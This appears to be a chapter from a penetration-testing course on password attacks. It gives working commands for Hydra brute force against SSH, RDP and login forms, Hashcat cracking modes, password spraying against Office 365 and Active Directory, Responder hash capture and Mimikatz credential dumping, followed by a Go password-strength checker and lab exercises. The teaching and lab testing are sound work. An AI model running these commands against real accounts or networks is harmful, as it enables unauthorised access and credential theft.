# Chapter 34: Password Attacks — Cracking, Spraying, and Harvesting

*Stolen or cracked credentials are used in the vast majority of breaches. Understanding how passwords are attacked is essential for building proper defenses and testing them.*

---

## Password Hashing

Passwords should never be stored plaintext. They're hashed:

```
Password: "password123"
→ bcrypt($2a$12$...):  $2a$12$LZm8KJ1RJ2H6Jf7B3n...
→ SHA-512 (Linux):     $6$salt$longhash...
→ MD5 (broken):        482c811da5d5b4bc6d497ffa98491e38
→ NTLM (Windows):      7a21990fcd3d759941e45c490f143d5f
```

**Cost matters:** bcrypt with cost=12 takes ~250ms per hash. Hashcat can try 10 billion MD5 hashes/second. The difference is the defense.

---

## Online vs Offline Attacks

**Online attacks:** Try passwords directly against a live service
- Brute force SSH, RDP, web login
- Limited by rate limiting and lockouts
- Tools: Hydra, Medusa

**Offline attacks:** Crack captured hash file
- No rate limiting, use full GPU power
- Need hash first (from DB dump, shadow file, network capture)
- Tools: Hashcat, John the Ripper

---

## Hydra — Online Password Attacks

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# HTTP POST login form
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid password"
# Format: URL:POST_DATA:FAILURE_STRING

# FTP
hydra -l admin -P passwords.txt ftp://192.168.1.100

# Multiple users from file
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# Limit speed (avoid lockout)
hydra -l admin -P passwords.txt -t 4 -w 30 ssh://192.168.1.100
```

---

## Hashcat — Offline Password Cracking

```bash
# Identify hash type
hashcat --identify hash.txt
# or: hash-identifier

# Common hash modes
# -m 0    = MD5
# -m 100  = SHA1
# -m 1800 = sha512crypt (Linux $6$)
# -m 3200 = bcrypt
# -m 1000 = NTLM (Windows)
# -m 5500 = NetNTLMv1
# -m 5600 = NetNTLMv2 (from Responder)
# -m 22000 = WPA2

# Dictionary attack
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules (mangling rules — common mutations)
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Combination attack (combine two wordlists)
hashcat -m 0 hashes.txt -a 1 wordlist1.txt wordlist2.txt

# Mask attack (know format, e.g., Password + 4 digits)
hashcat -m 0 hash.txt -a 3 Password?d?d?d?d
# ?d = digit, ?u = uppercase, ?l = lowercase, ?s = special

# Show cracked passwords
hashcat -m 0 hashes.txt --show
```

---

## Password Spraying

Instead of many passwords for one user, try one password against many users.

**Why:** Avoids account lockout (which triggers after X failed attempts per account)

```bash
# Common spray passwords: Season+Year, Company+Year, Password1
# e.g., Winter2024!, Spring2025!, CompanyName1!

# Spray against Office 365
o365spray --spray -U users.txt -p "Winter2024!" --domain company.com

# Spray against Active Directory (domain)
crackmapexec smb 192.168.1.0/24 -u users.txt -p "Password1" --no-bruteforce

# Wait between attempts (1 attempt per 30 mins per account)
# Most lockout policies: 5 failures in X minutes
```

---

## Capturing Hashes

### Responder — LLMNR/NBT-NS Poisoning

On Windows networks, LLMNR and NBT-NS broadcast name resolution requests. Responder answers these requests, capturing NTLMv2 hashes.

```bash
sudo responder -I eth0
# Listen for name resolution broadcasts

# When a Windows machine tries to access \\nonexistent-share\
# → Broadcasts LLMNR query
# → Responder answers: "I'm the host you're looking for!"
# → Windows authenticates → NTLMv2 hash captured

# Output:
# [+] Username: CORP\john
# [+] Hash: CORP\john::DESKTOP01:abc123...(NTLMv2 hash)

# Crack with hashcat
hashcat -m 5600 captured.txt rockyou.txt
```

### Mimikatz — Dump from Memory

```
# As SYSTEM on Windows:
privilege::debug
sekurlsa::logonpasswords  # plaintext + hashes from LSASS

# Works because:
# Windows caches credentials in LSASS for SSO
# WDigest authentication (legacy) = plaintext in memory
```

---

## Go: Password Security Checker

```go
package main

import (
    "fmt"
    "math"
    "strings"
    "unicode"
)

type PasswordStrength struct {
    Score    int
    Feedback []string
}

func analyzePassword(password string) PasswordStrength {
    result := PasswordStrength{}
    
    length := len(password)
    
    var hasUpper, hasLower, hasDigit, hasSpecial bool
    for _, c := range password {
        switch {
        case unicode.IsUpper(c): hasUpper = true
        case unicode.IsLower(c): hasLower = true
        case unicode.IsDigit(c): hasDigit = true
        default:                 hasSpecial = true
        }
    }
    
    // Score
    charsetSize := 0
    if hasUpper   { charsetSize += 26 }
    if hasLower   { charsetSize += 26 }
    if hasDigit   { charsetSize += 10 }
    if hasSpecial { charsetSize += 32 }
    
    entropy := float64(length) * math.Log2(float64(charsetSize))
    result.Score = int(entropy)
    
    if length < 12 {
        result.Feedback = append(result.Feedback, "Too short — use at least 12 characters")
    }
    if !hasUpper {
        result.Feedback = append(result.Feedback, "Add uppercase letters")
    }
    if !hasDigit {
        result.Feedback = append(result.Feedback, "Add numbers")
    }
    if !hasSpecial {
        result.Feedback = append(result.Feedback, "Add special characters")
    }
    
    // Common patterns
    commonPatterns := []string{"password", "123456", "qwerty", "letmein"}
    lower := strings.ToLower(password)
    for _, pattern := range commonPatterns {
        if strings.Contains(lower, pattern) {
            result.Feedback = append(result.Feedback, "Contains common pattern: "+pattern)
        }
    }
    
    return result
}

func main() {
    passwords := []string{
        "password123",
        "P@ssw0rd!",
        "correct-horse-battery-staple",
        "Tr0ub4dor&3",
    }
    
    for _, p := range passwords {
        strength := analyzePassword(p)
        fmt.Printf("Password: %-30s Entropy: %d bits\n", p, strength.Score)
        for _, fb := range strength.Feedback {
            fmt.Printf("  ⚠ %s\n", fb)
        }
    }
}
```

---

## Summary

| Attack | Best used when | Tool |
|--------|---------------|------|
| Dictionary attack | Password hash captured | `hashcat -a 0` |
| Rule-based attack | Dictionary + mutations | `hashcat -r best64.rule` |
| Brute force | Short password, limited charset | `hashcat -a 3` |
| Online brute force | Live service, no lockout | `hydra` |
| Password spraying | Domain users, avoid lockout | `crackmapexec`, `o365spray` |
| Responder | LAN access, Windows network | `responder` |
| Mimikatz | SYSTEM on Windows | `mimikatz` |

---

## Exercises

1. Use Hashcat to crack the password from this SHA-256 hash against `rockyou.txt`: `5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8`
2. Set up Responder in your lab. Trigger an LLMNR request from a Windows VM. Capture and crack the hash.
3. Build a Go tool that reads a list of password hashes and checks if any match common passwords
4. Practice password spraying on a test Active Directory lab — what's the optimal spray rate to avoid lockout?
